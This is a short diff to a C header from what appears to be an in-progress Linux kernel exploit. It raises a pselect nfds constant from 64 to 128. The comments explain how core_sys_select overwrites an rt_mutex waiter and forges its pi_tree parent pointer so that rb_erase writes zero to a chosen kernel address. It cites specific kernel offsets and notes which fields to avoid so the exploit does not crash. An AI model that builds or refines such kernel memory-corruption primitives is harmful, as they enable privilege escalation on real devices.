@@ -74,26 +74,20 @@ extern int g_core_consumer;
   (P0_PAGE_OFFSET | ((image_addr) - KIMAGE_TEXT_BASE + P0_KERNEL_PHYS_DELTA))
 
 #define CONSUMER_MAX_CALLS 1
-/* 64 -> 1 word per set -> core_sys_select copies only bits[0..2] onto the
- * waiter (waiter+0x00..+0x17 = tree_entry). pi_tree_entry (+0x18..+0x2f),
- * task (+0x30) and lock (+0x38) are NOT copied and keep their real
- * kernel-written values.
+/* 128 -> 2 words per set -> core_sys_select copies bits[0..5] onto the
+ * waiter covering tree_entry (+0x00..+0x17) and pi_tree_entry (+0x18..+0x2f).
+ * task (+0x30) and lock (+0x38) are NOT copied and keep their real values.
  *
- * Why not 128 (2 words/set)? bits[0..5] would cover +0x00..+0x28, which
- * includes pi_tree_entry. The map sets pi_tree_entry.__rb_parent_color=0
- * (waiter is root of the owner's pi_waiters). When sched_setattr triggers
- * rt_mutex_adjust_prio_chain, the chain walk reads the owner's pi_waiters,
- * finds W with corrupted pi_tree_entry (parent=0, RED), and crashes.
+ * DIAGNOSTIC (2026-08-17): NFDS=128 to test the pi_tree write-0 primitive.
+ * pi_tree_entry.__rb_parent_color is set to fake_parent (= target-8) so that
+ * the pi_waiters rb_erase in rt_mutex_adjust_prio_chain writes through the
+ * parent pointer.  Risk: the corrupted pi_tree may cause a crash in the chain
+ * walk or insert path.  User will RAMDUMP to verify control flow.
  *
  * Why not 320 (5 words/set)? waiter->lock (+0x38) would be zeroed by the
- * FD_ZERO'd copy. task_blocks_on_rt_mutex (0x1eaa28), remove_waiter
- * (0x1eb540) and mark_wakeup_next_waiter (0x1ea138) all BUG (brk #0x800)
- * when the tree root's ->lock != lock.
- *
- * 64 nfds: tree_entry fields (+0x00..+0x17) are set by the map:
- *   tree_pc=1 (BLACK root), tree_right=0, tree_left=0.
- * Everything beyond +0x17 stays real. */
-#define PSELECT_ROUTE_NFDS 64
+ * FD_ZERO'd copy.  BUG_ON(root->lock != lock) in remove_waiter / mark_wakeup
+ * would fire immediately. */
+#define PSELECT_ROUTE_NFDS 128
 #define PSELECT_CONSUMER_NICE 19
 #define PSELECT_CONSUMER_BURST_CALLS 1
 #define PSELECT_CONSUMER_SETTLE_USEC 250000
